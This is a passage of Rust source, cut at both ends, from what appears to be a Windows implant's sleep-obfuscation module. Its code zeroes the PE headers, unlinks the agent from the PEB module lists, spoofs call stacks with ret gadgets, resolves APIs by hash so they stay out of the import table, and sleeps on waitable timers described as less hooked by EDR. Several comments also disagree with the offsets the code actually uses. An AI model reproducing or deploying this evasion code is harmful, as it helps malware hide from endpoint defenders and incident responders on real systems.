    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let nt_sig = base.add(e_lfanew) as *const u32;
    if *nt_sig != 0x4550 {
        // PE\0\0 signature missing.
        return;
    }
    // SizeOfHeaders is at NT headers + 0x5C (FileHeader is 20 bytes, OptionalHeader
    // starts at +0x18, SizeOfHeaders is the 60th byte of OptionalHeader on PE32+).
    let size_of_headers = *(base.add(e_lfanew + 0x54) as *const u32) as usize;
    if size_of_headers == 0 || size_of_headers > 4096 {
        return;
    }
    // Make writable, zero, restore.
    if let Some(_old) = protect_memory(base, size_of_headers, PAGE_READWRITE) {
        std::ptr::write_bytes(base, 0, size_of_headers);
        let _ = protect_memory(base, size_of_headers, PAGE_READONLY);
    }
}

/// Restore PE headers from the backed-up copy.
///
/// `orig_prot` is the protection that was active before zeroing (captured by
/// `backup_pe_headers`). Falls back to `PAGE_EXECUTE_READ` if `None`.
unsafe fn restore_pe_headers(header_backup: &[u8], orig_prot: Option<u32>) {
    #[cfg(target_arch = "x86_64")]
    let base: *mut u8 = {
        let teb: usize;
        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb, options(nostack, nomem, preserves_flags));
        let peb = *((teb + 0x60) as *const usize) as *const u8;
        *(peb.add(0x10) as *const usize) as *mut u8
    };
    #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
    let base: *mut u8 = {
        let teb: usize;
        std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
        let peb = *((teb + 0x60) as *const usize) as *const u8;
        *(peb.add(0x10) as *const usize) as *mut u8
    };
    #[cfg(not(any(
        target_arch = "x86_64",
        all(target_arch = "aarch64", target_os = "windows")
    )))]
    let base: *mut u8 = std::ptr::null_mut();

    if base.is_null() || header_backup.is_empty() {
        return;
    }
    if let Some(_old) = protect_memory(base, header_backup.len(), PAGE_READWRITE) {
        std::ptr::copy_nonoverlapping(header_backup.as_ptr(), base, header_backup.len());
        // Restore to the exact original protection (not a hardcoded value).
        let prot = orig_prot.unwrap_or(PAGE_EXECUTE_READ);
        let _ = protect_memory(base, header_backup.len(), prot);
    }
}

/// Back up PE headers before zeroing.
///
/// Returns `(header_bytes, original_protection)` so `restore_pe_headers`
/// can restore the exact page protection rather than hardcoding a value.
unsafe fn backup_pe_headers() -> (Vec<u8>, Option<u32>) {
    #[cfg(target_arch = "x86_64")]
    let base: *const u8 = {
        let teb: usize;
        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb, options(nostack, nomem, preserves_flags));
        let peb = *((teb + 0x60) as *const usize) as *const u8;
        *(peb.add(0x10) as *const usize) as *const u8
    };
    #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
    let base: *const u8 = {
        let teb: usize;
        std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
        let peb = *((teb + 0x60) as *const usize) as *const u8;
        *(peb.add(0x10) as *const usize) as *const u8
    };
    #[cfg(not(any(
        target_arch = "x86_64",
        all(target_arch = "aarch64", target_os = "windows")
    )))]
    let base: *const u8 = std::ptr::null();

    if base.is_null() {
        return (Vec::new(), None);
    }
    let dos_e_magic = base as *const u16;
    if *dos_e_magic != 0x5A4D {
        return (Vec::new(), None);
    }
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let nt_sig = base.add(e_lfanew) as *const u32;
    if *nt_sig != 0x4550 {
        return (Vec::new(), None);
    }
    let size_of_headers = *(base.add(e_lfanew + 0x54) as *const u32) as usize;
    if size_of_headers == 0 || size_of_headers > 4096 {
        return (Vec::new(), None);
    }
    // Capture the current page protection so we can restore to the exact
    // same value on wake (avoids hardcoding PAGE_EXECUTE_READ).
    let orig_prot = protect_memory(base as *mut u8, size_of_headers, PAGE_READWRITE);
    // Restore the protection immediately — zero_pe_headers will change it
    // again shortly.
    if let Some(p) = orig_prot {
        let _ = protect_memory(base as *mut u8, size_of_headers, p);
    }
    let backup = std::slice::from_raw_parts(base, size_of_headers).to_vec();
    (backup, orig_prot)
}

/// Unlink the agent's own module from the PEB_LDR_DATA list so that
/// `!PEB->Ldr->InMemoryOrderModuleList` walks skip it.
///
/// Returns the original links so they can be restored on wake.
unsafe fn unlink_from_peb() -> Option<(*mut u8, *mut u8, *mut u8, *mut u8)> {
    #[cfg(target_arch = "x86_64")]
    let peb: *const u8 = {
        let teb: usize;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) teb, options(nostack, nomem, preserves_flags));
        teb as *const u8
    };
    #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
    let peb: *const u8 = {
        let teb: usize;
        std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
        (teb + 0x60) as *const u8
    };
    #[cfg(not(any(
        target_arch = "x86_64",
        all(target_arch = "aarch64", target_os = "windows")
    )))]
    let peb: *const u8 = std::ptr::null();

    if peb.is_null() {
        return None;
    }

    // PEB->Ldr is at offset 0x18 on x86-64.
    let ldr = *(peb.add(0x18) as *const usize) as *mut u8;
    if ldr.is_null() {
        return None;
    }

    // InMemoryOrderModuleList head is at LDR + 0x20.
    // InLoadOrderModuleList head is at LDR + 0x10.
    // InInitializationOrderModuleList head is at LDR + 0x30.
    //
    // Each LDR_DATA_TABLE_ENTRY has:
    //   InLoadOrderLinks          at +0x00
    //   InMemoryOrderLinks        at +0x10
    //   InInitializationOrderLinks at +0x20
    //   DllBase                   at +0x30
    //
    // We want to find the entry whose DllBase == our image base, then
    // unlink it from all three lists.

    #[cfg(target_arch = "x86_64")]
    let image_base: usize = { *(peb.add(0x10) as *const usize) };
    #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
    let image_base: usize = { *(peb.add(0x10) as *const usize) };
    #[cfg(not(any(
        target_arch = "x86_64",
        all(target_arch = "aarch64", target_os = "windows")
    )))]
    let image_base: usize = 0;

    if image_base == 0 {
        return None;
    }

    // Walk InMemoryOrderModuleList.
    let list_head = (ldr as usize + 0x20) as *mut usize;
    let mut current = *list_head as *mut u8;

    // The InMemoryOrderLinks field is at +0x10 within the entry.
    // To get the entry base from the InMemoryOrderLinks pointer, subtract 0x10.
    let mut entry: *mut u8 = std::ptr::null_mut();
    let mut found = false;
    for _ in 0..512 {
        // Safety limit on list walk.
        if current.is_null() || current as usize == list_head as usize {
            break;
        }
        let entry_candidate = current.sub(0x10);
        let dll_base = *(entry_candidate.add(0x30) as *const usize);
        if dll_base == image_base {
            entry = entry_candidate;
            found = true;
            break;
        }
        // Flink is at offset 0 within the LIST_ENTRY.
        current = *(current as *const usize) as *mut u8;
    }

    if !found || entry.is_null() {
        return None;
    }

    // Unlink from InLoadOrderLinks (+0x00).
    let load_entry = entry;
    let load_blink = *(load_entry.add(0x08) as *const usize) as *mut usize;
    let load_flink = *(load_entry.add(0x00) as *const usize) as *mut usize;
    if !load_blink.is_null() && !load_flink.is_null() {
        *load_blink = load_flink as usize;
        *(load_flink.add(1)) = load_blink as usize;
    }

    // Unlink from InMemoryOrderLinks (+0x10).
    let mem_entry = entry.add(0x10);
    let mem_blink = *(mem_entry.add(0x08) as *const usize) as *mut usize;
    let mem_flink = *(mem_entry.add(0x00) as *const usize) as *mut usize;
    if !mem_blink.is_null() && !mem_flink.is_null() {
        *mem_blink = mem_flink as usize;
        *(mem_flink.add(1)) = mem_blink as usize;
    }

    // Unlink from InInitializationOrderLinks (+0x20).
    let init_entry = entry.add(0x20);
    let init_blink = *(init_entry.add(0x08) as *const usize) as *mut usize;
    let init_flink = *(init_entry.add(0x00) as *const usize) as *mut usize;
    if !init_blink.is_null() && !init_flink.is_null() {
        *init_blink = init_flink as usize;
        *(init_flink.add(1)) = init_blink as usize;
    }

    Some((
        load_flink as *mut u8,
        load_blink as *mut u8,
        mem_flink as *mut u8,
        mem_blink as *mut u8,
    ))
}

// ── Call-stack spoofing ──────────────────────────────────────────────────────

/// Spoof the call stack during the sleep window.
///
/// When `fake_module_name` is provided, we resolve a suitable `ret` gadget
/// inside the named module (or fall back to ntdll) and build a spoofed
/// frame chain:
///
/// ```text
/// ntdll!RtlUserThreadStart
///   → kernel32!BaseThreadInitThunk
///     → fake_module!FakeExport   (if provided)
///       → NtDelayExecution
/// ```
///
/// Returns a stack handle used by `restore_call_stack`.
unsafe fn spoof_call_stack(fake_module_name: &Option<String>) -> Option<StackSpoofHandle> {
    // Find a `ret` gadget in ntdll for RtlUserThreadStart → BaseThreadInitThunk.
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;

    // Resolve kernel32 for BaseThreadInitThunk.
    let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))?;

    // Find a `ret` gadget in ntdll (for RtlUserThreadStart cover).
    let ntdll_ret = find_ret_gadget(ntdll)?;

    // Find a `ret` gadget in kernel32 (for BaseThreadInitThunk cover).
    let kernel32_ret = find_ret_gadget(kernel32)?;

    // If a fake module is specified, find a ret gadget there too.
    let fake_ret = if let Some(ref mod_name) = fake_module_name {
        let mut name_with_null = mod_name.as_bytes().to_vec();
        name_with_null.push(0);
        let fake_base =
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(&name_with_null))?;
        Some(find_ret_gadget(fake_base)?)
    } else {
        None
    };

    Some(StackSpoofHandle {
        ntdll_ret,
        kernel32_ret,
        fake_ret,
    })
}

/// Scan for a `ret` gadget inside the module's .text section.
///
/// # x86-64
///
/// Scans for the single-byte `ret` opcode `0xC3` in 1-byte steps.
///
/// # ARM64
///
/// Scans for the 4-byte `ret` instruction `0xD65F03C0` in 4-byte-aligned
/// steps.  On ARM64 every instruction is exactly 4 bytes wide and must be
/// 4-byte aligned, so we scan in `u32` steps rather than byte-by-byte.
///
/// P2-02: Before scanning, verify the region is still committed via
/// `NtQueryVirtualMemory` to guard against module unload races.
fn find_ret_gadget(module_base: usize) -> Option<usize> {
    // We look for a `ret` near the beginning of the module's code section.
    // Start scanning from the base + 0x1000 (typically .text section start).
    unsafe {
        for offset in (0x1000..0x2000).step_by(0x10) {
            let addr = module_base + offset;

            // P2-02: Verify the page is still committed before reading.
            // Use NtQueryVirtualMemory to check that the region is readable.
            let mut mbi: Mbi = std::mem::zeroed();
            let mut ret_len: usize = 0;
            let ntdll_base = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            {
                Some(b) => b,
                None => return None,
            };
            let qvm_addr = match pe_resolve::get_proc_address_by_hash(
                ntdll_base,
                pe_resolve::hash_str(b"NtQueryVirtualMemory\0"),
            ) {
                Some(a) => a,
                None => return None,
            };
            let nt_query_vm: extern "system" fn(
                usize,
                *mut std::ffi::c_void,
                u32,
                *mut std::ffi::c_void,
                usize,
                *mut usize,
            ) -> i32 = std::mem::transmute(qvm_addr);
            let status = nt_query_vm(
                (-1isize) as usize,
                addr as *mut std::ffi::c_void,
                0, // MemoryBasicInformation
                &mut mbi as *mut _ as *mut std::ffi::c_void,
                std::mem::size_of::<Mbi>(),
                &mut ret_len,
            );
            // If the query fails or the region is not committed, skip.
            if status != 0 || mbi.state != MEM_COMMIT {
                continue;
            }

            #[cfg(target_arch = "x86_64")]
            {
                let probe = std::slice::from_raw_parts(addr as *const u8, 256);
                for (i, &byte) in probe.iter().enumerate() {
                    if byte == 0xC3 {
                        return Some(addr + i);
                    }
                }
            }

            #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
            {
                // ARM64 `ret` instruction encoding: 0xD65F03C0
                // Every ARM64 instruction is exactly 4 bytes wide and 4-byte
                // aligned, so we scan in u32 steps.
                const ARM64_RET: u32 = 0xD65F03C0;
                let probe = std::slice::from_raw_parts(addr as *const u32, 64); // 256 bytes / 4
                for (i, &inst) in probe.iter().enumerate() {
                    if inst == ARM64_RET {
                        return Some(addr + i * 4);
                    }
                }
            }
        }
    }
    None
}

struct StackSpoofHandle {
    ntdll_ret: usize,
    kernel32_ret: usize,
    fake_ret: Option<usize>,
}

/// Restore (no-op for now — spoofing is only active during the NtDelayExecution
/// call which uses the NtContinue-based path from syscalls.rs).
unsafe fn restore_call_stack(_handle: StackSpoofHandle) {
    // The stack spoofing is managed by the NtContinue path in syscalls.rs
    // and is restored automatically when the syscall returns.
}

// ── Self-destruct on AEAD failure ────────────────────────────────────────────

/// Terminate the agent process immediately when AEAD verification fails
/// (memory tampering detected).
pub(crate) unsafe fn self_destruct() -> ! {
    tracing::error!("[sleep_obfuscation] AEAD verification failed — self-destructing");

    // Try NtTerminateProcess first (avoids IAT hooks).
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
    if let Some(base) = ntdll {
        if let Some(addr) = pe_resolve::get_proc_address_by_hash(
            base,
            pe_resolve::hash_str(b"NtTerminateProcess\0"),
        ) {
            let nt_terminate: extern "system" fn(usize, u32) -> i32 = std::mem::transmute(addr);
            nt_terminate((-1isize) as usize, 1);
        }
    }

    // Last resort: ask the OS to kill us via pe_resolve to avoid IAT entries.
    if let Some(kernel32) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
        if let Some(addr) = pe_resolve::get_proc_address_by_hash(
            kernel32,
            pe_resolve::hash_str(b"TerminateProcess\0"),
        ) {
            let tp: unsafe extern "system" fn(usize, u32) -> i32 = std::mem::transmute(addr);
            tp((-1isize) as usize, 1); // -1 = current process pseudo-handle
        }
    }

    // If even that fails, abort.
    std::process::abort();
}

// ── Cronus (waitable-timer) sleep variant ────────────────────────────────────
//
// The Cronus variant replaces NtDelayExecution with an unnamed waitable timer
// created via NtSetTimer.  This is less commonly hooked by EDR.  The core
// idea:
//
//   1. Create an unnamed waitable timer (NtCreateTimer).
//   2. Set a negative relative timeout (NtSetTimer) to sleep for the
//      requested duration.
//   3. Wait on the timer handle with NtWaitForSingleObject (alertable wait).
//      The kernel signals the timer when the timeout expires.
//   4. On wake, proceed with the normal decrypt/restore sequence.
//
// The encryption/decryption still uses the existing XChaCha20-Poly1305 path
// for the main agent regions.  A position-independent stub is used for the
// optional "encrypt-then-wait" pattern in remote process contexts.  The stub
// delegates to a caller-supplied function pointer (XChaCha20 stream cipher)
// instead of inlining crypto, avoiding the complexity of hand-crafted
// position-independent cipher code.
//
// # Auto-select
//
// When Cronus is selected, we verify that NtSetTimer resolves.  If not, we
// fall back to Ekko (NtDelayExecution) with a log warning.

/// XChaCha20-Poly1305 AEAD encryption for the Cronus stub.
///
/// P0-16: Replaced raw XChaCha20 with XChaCha20-Poly1305.  The Poly1305
/// authentication tag (16 bytes) is returned as a sidecar buffer so callers
/// can store it alongside the encrypted region and verify integrity on wake.
/// If any tag fails verification, the process self-destructs (matching the
/// existing behaviour for main-agent regions).
///
/// The position-independent stub itself still delegates to a function pointer
/// for the stream cipher — the tag is computed and verified in the Rust host
/// code, not inside the stub.
fn xchacha20_encrypt(key: &[u8; 32], nonce: &[u8; 24], data: &mut [u8]) -> [u8; 16] {
    let iv = XNonce::from_slice(nonce);
    let cipher = XChaCha20Poly1305::new(key.into());
    // We need to encrypt in-place and produce a tag without extending the buffer.
    // Use the underlying stream cipher for encryption, then compute Poly1305 tag
    // over the ciphertext.
    //
    // Approach: encrypt with raw XChaCha20 stream, then compute Poly1305 MAC
    // over the ciphertext using the AEAD construction's tag computation.
    // We achieve this by using encrypt_in_place_detached which returns the tag.
    let aad: &[u8] = b"";
    let mut buf = data.to_vec();
    let tag = cipher
        .encrypt_in_place_detached(iv, aad, &mut buf)
        .expect("XChaCha20-Poly1305 encryption should not fail for valid input");
    data.copy_from_slice(&buf);
    tag.into()
}

/// XChaCha20-Poly1305 AEAD decryption for the Cronus stub.
///
/// Returns `Ok(())` if the tag verifies, or `Err` on tampering.
fn xchacha20_decrypt(
    key: &[u8; 32],
    nonce: &[u8; 24],
    data: &mut [u8],
    tag: &[u8; 16],
) -> Result<()> {
    let iv = XNonce::from_slice(nonce);
    let cipher = XChaCha20Poly1305::new(key.into());
    let aad: &[u8] = b"";
    let mut buf = data.to_vec();
    cipher
        .decrypt_in_place_detached(iv, aad, &mut buf, tag.into())
        .map_err(|_| {
            anyhow!("Cronus XChaCha20-Poly1305 tag verification failed — possible tampering")
        })?;
    data.copy_from_slice(&buf);
    Ok(())
}

/// Free a previously allocated Cronos stub.
unsafe fn cronus_free_stub(addr: usize, size: usize) {
    if addr == 0 || size == 0 {
        return;
    }
    #[cfg(feature = "direct-syscalls")]
    {
        let mut base = addr as *mut std::ffi::c_void;
        let mut region_size = size;
        let status = crate::syscalls::syscall_NtProtectVirtualMemory(
            (-1isize) as usize as u64,
            &mut base as *mut _ as u64,
            &mut region_size as *mut _ as u64,
            0x04u64, // PAGE_READWRITE
            0u64,
        );
        if status >= 0 {
            // Zero the stub memory before freeing.
            std::ptr::write_bytes(addr as *mut u8, 0, size);

            // Free via pe_resolve → VirtualFree to avoid IAT entry.
            if let Some(kernel32) =
                pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
            {
                if let Some(vf_addr) = pe_resolve::get_proc_address_by_hash(
                    kernel32,
                    pe_resolve::hash_str(b"VirtualFree\0"),
                ) {
                    let vf: unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32) -> i32 =
                        std::mem::transmute(vf_addr);
                    let _ = vf(
                        addr as *mut std::ffi::c_void,
                        0,
                        0x8000u32, // MEM_RELEASE
                    );
                }
            }
        }
    }
    #[cfg(not(feature = "direct-syscalls"))]
    {
        if let Some(kernel32) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
        {
            if let Some(vf_addr) = pe_resolve::get_proc_address_by_hash(
                kernel32,
                pe_resolve::hash_str(b"VirtualFree\0"),
            ) {
                let vf: unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32) -> i32 =
                    std::mem::transmute(vf_addr);
                let _ = vf(
                    addr as *mut std::ffi::c_void,
                    0,
                    0x8000u32, // MEM_RELEASE
                );
            }
        }
    }
}

/// Check whether the NtSetTimer syscall can be resolved (auto-select probe).
///
/// Returns `true` if the NT API calls needed for Cronus are available.
fn cronus_probe() -> bool {
    #[cfg(feature = "direct-syscalls")]
    {
        // Try resolving NtSetTimer and NtCreateTimer.
        crate::syscalls::get_syscall_id("NtSetTimer").is_ok()
            && crate::syscalls::get_syscall_id("NtCreateTimer").is_ok()
            && crate::syscalls::get_syscall_id("NtWaitForSingleObject").is_ok()
    }
    #[cfg(not(feature = "direct-syscalls"))]
    {
        // When not using direct syscalls, resolve via pe_resolve.
        let ntdll = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) };
        if let Some(base) = ntdll {
            unsafe {
                pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"NtSetTimer\0"))
                    .is_some()
                    && pe_resolve::get_proc_address_by_hash(
                        base,
                        pe_resolve::hash_str(b"NtCreateTimer\0"),
                    )
                    .is_some()
                    && pe_resolve::get_proc_address_by_hash(
                        base,
                        pe_resolve::hash_str(b"NtWaitForSingleObject\0"),
                    )
                    .is_some()
            }
        } else {
            false
        }
    }
}

/// Perform the Cronus-style sleep using a waitable timer.
///
/// Creates an unnamed notification timer, sets it with a negative relative
/// timeout, and waits on the handle.  The wait is alertable so that APC
/// callbacks (if any) can fire.
///
/// Returns `Ok(())` on success, `Err` if any NT API call fails.
unsafe fn cronus_sleep(duration: std::time::Duration) -> Result<()> {
    let timeout_100ns = duration_to_100ns(duration);

    #[cfg(feature = "direct-syscalls")]
    {
        // 1. Create an unnamed waitable timer.
        let mut timer_handle: usize = 0;
        let status = crate::syscalls::syscall_NtCreateTimer(
            &mut timer_handle as *mut _ as u64,
            0x001F0003u64, // TIMER_ALL_ACCESS
            0u64,          // NULL ObjectAttributes (unnamed)
            0u64,          // NotificationTimer
        );
        if status < 0 || timer_handle == 0 {
            return Err(anyhow!(
                "NtCreateTimer failed: NTSTATUS={:#010x}",
                status as u32
            ));
        }

        // 2. Set the timer with a negative relative timeout.
        let mut due_time = timeout_100ns;
        let status = crate::syscalls::syscall_NtSetTimer(
            timer_handle as u64,
            &mut due_time as *mut _ as u64,
            0u64, // No APC routine — we wait on the handle
            0u64, // No context
            0u64, // ResumeTimer = FALSE
            0u64, // Period = 0 (one-shot)
            0u64, // No previous state
        );
        if status < 0 {
            // Clean up timer on failure.
            crate::syscalls::syscall_NtClose(timer_handle as u64);
            return Err(anyhow!(
                "NtSetTimer failed: NTSTATUS={:#010x}",
                status as u32
            ));
        }

        // 3. Wait for the timer to be signaled (alertable wait).
        //    Timeout = NULL means wait indefinitely.  Alertable = TRUE so
        //    the timer APC can fire.
        let _wait_status = crate::syscalls::syscall_NtWaitForSingleObject(
            timer_handle as u64,
            1u64, // Alertable = TRUE
            0u64, // No timeout (wait until signaled)
        );

        // 4. Close the timer handle.
        crate::syscalls::syscall_NtClose(timer_handle as u64);

        Ok(())
    }

    #[cfg(not(feature = "direct-syscalls"))]
    {
        // Resolve via pe_resolve and call via function pointers.
        let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .ok_or_else(|| anyhow!("cannot resolve ntdll"))?;

        // NtCreateTimer
        let create_addr =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtCreateTimer\0"))
                .ok_or_else(|| anyhow!("cannot resolve NtCreateTimer"))?;

        // NtSetTimer
        let set_addr =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtSetTimer\0"))
                .ok_or_else(|| anyhow!("cannot resolve NtSetTimer"))?;

        // NtWaitForSingleObject
        let wait_addr = pe_resolve::get_proc_address_by_hash(
            ntdll,
            pe_resolve::hash_str(b"NtWaitForSingleObject\0"),
        )
        .ok_or_else(|| anyhow!("cannot resolve NtWaitForSingleObject"))?;

        // NtClose
        let close_addr =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtClose\0"))
                .ok_or_else(|| anyhow!("cannot resolve NtClose"))?;

        type FnNtCreateTimer = unsafe extern "system" fn(*mut usize, u32, usize, u32) -> i32;
        type FnNtSetTimer =
            unsafe extern "system" fn(usize, *const i64, usize, usize, u8, i32, *mut u8) -> i32;
        type FnNtWaitForSingleObject = unsafe extern "system" fn(usize, u8, *const i64) -> i32;
        type FnNtClose = unsafe extern "system" fn(usize) -> i32;

        let nt_create: FnNtCreateTimer = std::mem::transmute(create_addr);
        let nt_set: FnNtSetTimer = std::mem::transmute(set_addr);
        let nt_wait: FnNtWaitForSingleObject = std::mem::transmute(wait_addr);
        let nt_close: FnNtClose = std::mem::transmute(close_addr);

        // 1. Create an unnamed waitable timer.
        let mut timer_handle: usize = 0;
        let status = nt_create(
            &mut timer_handle,
            0x001F0003, // TIMER_ALL_ACCESS
            0,          // NULL ObjectAttributes
            0,          // NotificationTimer
        );
        if status < 0 || timer_handle == 0 {
            return Err(anyhow!(
                "NtCreateTimer failed: NTSTATUS={:#010x}",
                status as u32
            ));
        }

        // 2. Set the timer with a negative relative timeout.
        let due_time = timeout_100ns;
        let status = nt_set(
            timer_handle,
            &due_time,
            0, // No APC routine
            0, // No context
            0, // ResumeTimer = FALSE
            0, // Period = 0 (one-shot)
            std::ptr::null_mut(),
        );
        if status < 0 {
            nt_close(timer_handle);
            return Err(anyhow!(
                "NtSetTimer failed: NTSTATUS={:#010x}",
                status as u32
            ));
        }

        // 3. Wait for the timer to be signaled.
        let _wait_status = nt_wait(timer_handle, 1, std::ptr::null());

        // 4. Close the timer handle.
        nt_close(timer_handle);

        Ok(())
    }
}

/// Generate a position-independent XChaCha20 encryption stub for remote process
/// sleep encryption.
///
/// Instead of inlining cipher logic into position-independent machine code
/// (as the original RC4-based approach did), this stub delegates to a caller-supplied
/// function pointer.  The stub is a tiny x86-64 trampoline that:
/// 1. Receives (base_addr, size, fn_ptr) via RCX, RDX, R8
/// 2. Calls `fn_ptr(base_addr, size)`
/// 3. Returns the result
///
/// This avoids the complexity of hand-crafted position-independent crypto
/// code while still providing a callable encryption toggle.
///
/// The stub is allocated with PAGE_EXECUTE_READWRITE via VirtualAlloc
/// (resolved through pe_resolve to avoid IAT entries).
///
/// Returns (stub_addr, stub_size) on success.
unsafe fn cronus_build_xchacha20_stub() -> Result<(usize, usize)> {
    let stub_size = 4096; // one page

    // Allocate via pe_resolve → VirtualAlloc to avoid IAT entry.
    let stub_addr = if let Some(kernel32) =
        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
    {
        if let Some(va_addr) =
            pe_resolve::get_proc_address_by_hash(kernel32, pe_resolve::hash_str(b"VirtualAlloc\0"))
        {
            let va: unsafe extern "system" fn(
                *mut std::ffi::c_void,
                usize,
                u32,
                u32,
            ) -> *mut std::ffi::c_void = std::mem::transmute(va_addr);
            va(
                std::ptr::null_mut(),
                stub_size,
                0x3000u32, // MEM_COMMIT | MEM_RESERVE
                0x40u32,   // PAGE_EXECUTE_READWRITE
            )
        } else {
            return Err(anyhow!(
                "VirtualAlloc not resolved for Cronus XChaCha20 stub"
            ));
        }
    } else {
        return Err(anyhow!("kernel32 not resolved for Cronus XChaCha20 stub"));
    };
    if stub_addr.is_null() {
        return Err(anyhow!("VirtualAlloc failed for Cronus XChaCha20 stub"));
    }

    let base = stub_addr as *mut u8;

    // ── Build the position-independent trampoline ──
    //
    // The trampoline is a small function that:
    //   Input:  x0 = target base, x1 = target size, x2 = fn_ptr
    //   Calls:  fn_ptr(x0, x1)
    //   Output: x0 = fn_ptr return value
    //
    // ARM64 Windows ABI:
    //   - x0–x7: arguments / return value
    //   - x29: frame pointer (FP), x30: link register (LR)
    //   - SP must be 16-byte aligned on entry/exit
    //   - Q8–Q23: callee-saved NEON registers
    //
    // x86-64 Windows ABI:
    //   - RCX, RDX, R8: first three arguments
    //   - RAX: return value
    //   - Shadow space: 32 bytes on stack
    //   - RSP 16-byte aligned on call boundaries
    #[cfg(target_arch = "x86_64")]
    let code: [u8; 12] = [
        // sub rsp, 0x28        ; shadow space + alignment (Windows x64 ABI)
        0x48, 0x83, 0xEC, 0x28,
        // call r8              ; call fn_ptr(rcx, rdx)
        0x41, 0xFF, 0xD0,
        // add rsp, 0x28
        0x48, 0x83, 0xC4, 0x28,
        // ret
        0xC3,
    ];

    #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
    let code: [u8; 20] = [
        // stp x29, x30, [sp, #-16]!   ; save FP and LR, push frame
        0xFD, 0x7B, 0xBF, 0xA9,
        // mov x29, sp                  ; set frame pointer
        0xFD, 0x03, 0x00, 0x91,
        // blr x2                       ; call fn_ptr(x0, x1)
        0x20, 0x00, 0x3F, 0xD6,
        // ldp x29, x30, [sp], #16     ; restore FP and LR, pop frame
        0xFD, 0x7B, 0xC1, 0xA8,
        // ret                          ; return to caller
        0xC0, 0x03, 0x5F, 0xD6,
    ];

    std::ptr::copy_nonoverlapping(code.as_ptr(), base, code.len());

    // Flush instruction cache via pe_resolve.
    // Harmless on x86-64 (unified L1 I/D cache), but ESSENTIAL on ARM64
    // which has separate instruction and data caches (Harvard architecture).
    // Without this, the CPU may execute stale instruction bytes.
    if let Some(kernel32) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
        if let Some(fic_addr) = pe_resolve::get_proc_address_by_hash(
            kernel32,
            pe_resolve::hash_str(b"FlushInstructionCache\0"),
        ) {
            let fic: unsafe extern "system" fn(usize, *const std::ffi::c_void, usize) -> i32 =
                std::mem::transmute(fic_addr);
            fic((-1isize) as usize, stub_addr, code.len());
        }
    }

    Ok((stub_addr as usize, stub_size))
}

/// Execute the position-independent XChaCha20 stub to encrypt/decrypt a memory
/// region via the provided function pointer.
///
/// # Safety
///
/// The stub must have been built by `cronus_build_xchacha20_stub` and the
/// target region must be writable.  `fn_ptr` must point to a valid function
/// that accepts (base_addr: usize, size: usize) and performs the cipher
/// operation in-place.
unsafe fn cronus_exec_xchacha20_stub(
    stub_addr: usize,
    target_base: usize,
    target_size: usize,
    fn_ptr: unsafe extern "system" fn(usize, usize) -> i32,
) {
    if stub_addr == 0 || target_base == 0 || target_size == 0 {
        return;
    }
    let stub_fn: unsafe extern "system" fn(usize, usize, usize) -> i32 =
        std::mem::transmute(stub_addr as *const ());
    stub_fn(target_base, target_size, fn_ptr as usize);
}

// ── Core sleep function ──────────────────────────────────────────────────────

/// Perform a secure sleep with full memory encryption and anti-forensics.
///
/// This is the primary entry point.  It:
///
/// 1. Enumerates and caches all encodable memory regions.
/// 2. Generates (or uses provided) XChaCha20-Poly1305 key, stashes in CPU
///    registers (XMM14/XMM15 on x86-64, NEON Q22/Q23 on ARM64).
/// 3. Encrypts all regions in 64 KB chunks with per-region nonces.
/// 4. Optionally encrypts the stack.
/// 5. Applies anti-forensics (zero PE headers, PEB unlink, PAGE_NOACCESS).
/// 6. Spoofs the call stack.
/// 7. Sleeps via NtDelayExecution (Ekko) or NtSetTimer waitable timer (Cronus).
/// 8. On wake: verifies AEAD tags, decrypts everything, restores state.
/// 9. If any AEAD tag fails, terminates the process immediately.
///
/// # Safety
///
/// Must be called from a single thread.  Not async-safe.  Do not call while
/// any other thread is accessing agent memory regions.
pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
    let duration = std::time::Duration::from_millis(config.sleep_duration_ms);

    // CRIT-006: bump the generation inside the same lock that guards the
    // cached region data, eliminating the TOCTOU window.
    let gen = {
        let mut cache = region_cache().lock_recover();
        cache.generation += 1;
        cache.generation
    };

    // ── 1. Generate or use provided key ────────────────────────────────────
    let key = match config.encryption_key {
        Some(k) => k,
        None => {
            let mut k = [0u8; 32];
            OsRng.fill_bytes(&mut k);
            k
        }
    };
    let handle = KeyHandle::stash(key);

    // ── 2. Enumerate regions (use cache if generation matches) ─────────────
